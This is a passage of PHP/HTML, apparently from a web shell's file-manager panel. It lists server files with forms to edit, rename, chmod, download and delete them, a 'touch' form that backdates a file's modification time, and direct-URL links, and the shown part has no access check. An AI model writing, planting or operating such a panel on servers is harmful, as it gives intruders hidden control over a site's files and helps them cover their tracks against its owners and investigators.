        $full = $d . DIRECTORY_SEPARATOR . $item;
        $uid = substr(md5($full), 0, 8);
        $owner = get_owner($full);
        $perms = perm($full);
        $file_url = get_file_url($full);
        
        if ($perms == '0755' || $perms == '0644') {
            $pm_class = 'perms-0755';
        } elseif ($perms == '0555' || $perms == '0444') {
            $pm_class = 'perms-0555';
        } else {
            $pm_class = 'perms-other';
        }
    ?>
    <tr>
        <td><a href="?edit=<?=urlencode($full)?>" class="file"><?=htmlspecialchars($item)?></a></td>
        <td class="sz"><?=sz(@filesize($full))?></td>
        <td class="<?=$pm_class?>" onclick="togglePop('ch-<?=$uid?>')"><?=$perms?></td>
        <td class="own"><?=$owner?></td>
        <td class="dt" onclick="togglePop('dt-<?=$uid?>')"><?=date('Y-m-d H:i', @filemtime($full))?></td>
        <td class="act">
            <form method="post" style="display:inline"><input type="hidden" name="act" value="edit"><input type="hidden" name="target" value="<?=htmlspecialchars($full)?>"><button type="submit" class="link c-ed">edit</button></form>
            <span class="c-rn" onclick="togglePop('rn-<?=$uid?>')">rename</span>
            <a href="?download=<?=urlencode($full)?>" class="link c-dl" style="margin-right:5px;color:#fff;" onclick="return confirm('Download file?')">dw</a>
            <form method="post" style="display:inline"><input type="hidden" name="act" value="delete"><input type="hidden" name="target" value="<?=htmlspecialchars($item)?>"><button type="submit" class="link c-del" onclick="return confirm('Delete file?')">delete</button></form>
            <span class="c-link" onclick="togglePop('link-<?=$uid?>')" style="margin-left:5px;color:#ffaa00;cursor:pointer"></span>
            <div class="pop" id="rn-<?=$uid?>"><form method="post"><input type="hidden" name="act" value="rename"><input type="hidden" name="old_name" value="<?=htmlspecialchars($item)?>"><input type="text" name="new_name" value="<?=htmlspecialchars($item)?>" size="20"><button type="submit">OK</button> <span onclick="togglePop('rn-<?=$uid?>')" style="color:#e74c3c;cursor:pointer">x</span></form></div>
            <div class="pop" id="ch-<?=$uid?>"><form method="post"><input type="hidden" name="act" value="chmod"><input type="hidden" name="target" value="<?=htmlspecialchars($item)?>"><input type="text" name="perm" value="<?=$perms?>" size="6"><button type="submit">OK</button> <span onclick="togglePop('ch-<?=$uid?>')" style="color:#e74c3c;cursor:pointer">x</span></form></div>
            <div class="pop" id="dt-<?=$uid?>"><form method="post"><input type="hidden" name="act" value="touch"><input type="hidden" name="target" value="<?=htmlspecialchars($item)?>"><input type="datetime-local" name="datetime" value="<?=date('Y-m-d\TH:i', @filemtime($full))?>"><button type="submit">OK</button> <span onclick="togglePop('dt-<?=$uid?>')" style="color:#e74c3c;cursor:pointer">x</span></form></div>
            <div class="pop" id="link-<?=$uid?>">
                <label>Direct URL:</label>
                <input type="text" value="<?=htmlspecialchars($file_url)?>" readonly onclick="this.select()">
                <button onclick="navigator.clipboard.writeText('<?=htmlspecialchars($file_url)?>');alert('Copied!')">Copy</button>
                <span onclick="togglePop('link-<?=$uid?>')" style="color:#e74c3c;cursor:pointer;margin-left:8px">x</span>
            </div>
        </td>
        <td>
            <a href="<?=htmlspecialchars($file_url)?>" target="_blank" style="color:#6cb6ff;font-size:11px;" title="Open in new tab">🔗</a>
        </td>
    </tr>
    <?php endforeach; ?>
    </table>
</div>

<?php endif; ?>

<script>
function togglePop(id){
    document.querySelectorAll('.pop.show').forEach(e => e.classList.remove('show'));
    document.getElementById(id).classList.toggle('show');
}
</script>

</body>
</html>
